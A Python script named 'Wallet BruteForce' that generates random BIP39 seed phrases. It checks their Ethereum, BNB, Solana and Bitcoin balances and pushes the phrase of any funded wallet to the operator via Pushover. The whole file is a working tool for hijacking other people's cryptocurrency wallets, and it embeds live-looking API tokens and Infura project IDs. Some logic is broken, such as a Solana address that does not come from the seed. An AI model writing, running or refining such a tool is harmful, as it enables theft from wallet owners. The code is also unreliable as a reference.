import concurrent.futures
import random
import string
import ecdsa
import hashlib
import time
import os
from colorama import Fore, Style
import datetime
import requests
from mnemonic import Mnemonic
from web3 import Web3
from bitcoinlib.keys import HDKey
from web3.middleware import geth_poa_middleware
from pushover import Client
from solana.account import Account as SolanaAccount
from solana.rpc.api import Client as SolanaClient

# Prompt user for Pushover user and application tokens
PUSHOVER_USER_TOKEN = "achkd57jhn6qne8fujwghydb4iyi24"
PUSHOVER_APP_TOKEN = "u3kvd3y8m5r27qqv7s4veisnqpuqyk"

# Create a pushover client
client = Client(PUSHOVER_APP_TOKEN, api_token=PUSHOVER_USER_TOKEN)

# Define the correct password
CORRECT_PASSWORD = "your_password_here"

# Initialize Web3 for Ethereum (Ropsten Testnet)
eth_rpc_urls = [
    'https://ropsten.infura.io/v3/26257f242dea4af5b59a15d956f888ff'  # Add your fallback Infura project ID here
]

# Choose a random Ethereum API endpoint from the list
eth_rpc_url = random.choice(eth_rpc_urls)
w3_eth = Web3(Web3.HTTPProvider(eth_rpc_url))
w3_eth.middleware_onion.inject(geth_poa_middleware, layer=0)

# Initialize Web3 for Binance Smart Chain (Testnet)
bsc_rpc_url = 'https://data-seed-prebsc-1-s1.binance.org:8545/'
w3_bsc = Web3(Web3.HTTPProvider(bsc_rpc_url))

# Initialize Solana RPC Client
solana_rpc_url = 'https://api.devnet.solana.com'
solana_client = SolanaClient(solana_rpc_url)

# Load words from a text file
with open('words1.txt', 'r') as file:
    WORDS = file.read().splitlines()

# Define the exit flag
exit_flag = False

def generar_direccion_btc(seed_phrase_str):
    clave_maestra = HDKey.from_passphrase(seed_phrase_str, network='bitcoin')
    direccion_btc = clave_maestra.address()
    return direccion_btc

def obtener_saldo_btc(direccion_btc):
    url = f"https://api.blockchair.com/bitcoin/testnet/dashboards/address/{direccion_btc}"
    response = requests.get(url)
    if response.status_code == 200:
        data = response.json()
        balance = data["data"][direccion_btc]["address"]["balance"]
        return balance
    else:
        return 0

def obtener_direccion_solana(seed_phrase_str):
    account = SolanaAccount()
    return account.public_key()

def obtener_saldo_solana(public_key):
    balance = solana_client.get_balance(public_key)
    return balance['result']['value']

def send_notification(message):
    client.send_message(message, title='Wallet BruteForce')

def process_wallet_generation(password):
    global exit_flag  # Use the global flag

    # Send notification when the wallet generation process starts
    send_notification("Wallet BruteForce iniciado.")

    print(Fore.WHITE + "> Conectando APIS.....")
    time.sleep(2)
    print(Fore.GREEN + "> Conexion Exitosa")
    print("> Iniciando mineria.....")
    time.sleep(2)
    print()

    mnemonic = Mnemonic("english")

    eth_rpc_url = 'https://mainnet.infura.io/v3/a054154ba62441928ead432532efe94a'
    w3_eth = Web3(Web3.HTTPProvider(eth_rpc_url))
    w3_eth.middleware_onion.inject(geth_poa_middleware, layer=0)

    bsc_rpc_url = 'https://bsc-dataseed.binance.org/'
    w3_bsc = Web3(Web3.HTTPProvider(bsc_rpc_url))

    w3_eth.eth.account.enable_unaudited_hdwallet_features()

    generated_phrases = set()
    phrase_counter = 0
    phrase_counter_invalid = 0
    # Counter for generated phrases
    phrases_generated_counter = 0

    def generate_and_check(num_words):
        nonlocal phrase_counter, phrase_counter_invalid, phrases_generated_counter

        for _ in range(500000000):  # A high number to simulate large iterations
            seed_phrase = []
            for i in range(num_words):
                seed_phrase.append(random.choice(WORDS))
            seed_phrase_str = " ".join(seed_phrase)

            if mnemonic.check(seed_phrase_str):
                phrase_counter += 1
                seed_bytes = mnemonic.to_seed(seed_phrase_str)
                global exit_flag  # Use the global flag

                # Ethereum
                master_key_eth = w3_eth.eth.account.from_mnemonic(seed_phrase_str)
                address_eth = master_key_eth.address

                # Get the balance of Ethereum address
                balance_wei_eth = w3_eth.eth.get_balance(address_eth)
                balance_eth = w3_eth.from_wei(balance_wei_eth, 'ether')

                # Binance Smart Chain (BNB)
                address_bsc = master_key_eth.address  # BNB address is the same as Ethereum address

                # Get the balance of BNB address on BSC
                balance_wei_bsc = w3_bsc.eth.get_balance(address_bsc)
                balance_bsc = w3_bsc.from_wei(balance_wei_bsc, 'ether')

                # Solana
                public_key_solana = obtener_direccion_solana(seed_phrase_str)
                balance_solana = obtener_saldo_solana(public_key_solana)

                direccion_btc = generar_direccion_btc(seed_phrase_str)
                saldo_btc = obtener_saldo_btc(direccion_btc)

                os.system(f"title Wallets: {phrase_counter_invalid} {phrase_counter}" + Style.RESET_ALL)
                print(Fore.GREEN + "> Checking Phrase : | " + Fore.CYAN + seed_phrase_str + Style.RESET_ALL + Fore.WHITE + " | " + str(address_eth) +  Fore.BLUE + " | ETH: " + str(balance_eth) + Fore.YELLOW + " | BNB: " + str(balance_bsc) + Fore.RED + " | Solana: " + str(balance_solana))

                if balance_eth > 0.000000 or balance_bsc > 0.000000 or balance_solana > 0 or saldo_btc > 0.000000:
                        print(f"Se encontró una wallet con saldo: ETH={balance_eth}, BNB={balance_bsc}, Solana={balance_solana}, BTC={saldo_btc} Phrase: {seed_phrase_str + Style.RESET_ALL}")
                        break

                if balance_eth > 0.000000 or balance_bsc > 0.000000 or balance_solana > 0 or saldo_btc > 0.000000:
                        send_notification(f"Se encontró una wallet con saldo: ETH={balance_eth}, BNB={balance_bsc}, Solana={balance_solana}, BTC={saldo_btc} Phrase: {seed_phrase_str + Style.RESET_ALL}")
                        exit_flag = True

                # Check if 100 phrases have been generated
                phrases_generated_counter += 1
                if phrases_generated_counter >= 1000:
                    send_notification(f"Se han encontrado wallets sin saldo: {phrase_counter}. Continuando la búsqueda...")
                    phrases_generated_counter = 0  # Reset the counter

            generated_phrases.add(seed_phrase_str)
            time.sleep(0)

    with concurrent.futures.ThreadPoolExecutor() as executor:
        executor.submit(generate_and_check, 12)


password = input("Ingrese la contraseña: ")
if password == CORRECT_PASSWORD:
    process_wallet_generation(password)
else:
    print("Contraseña incorrecta o software caducado")
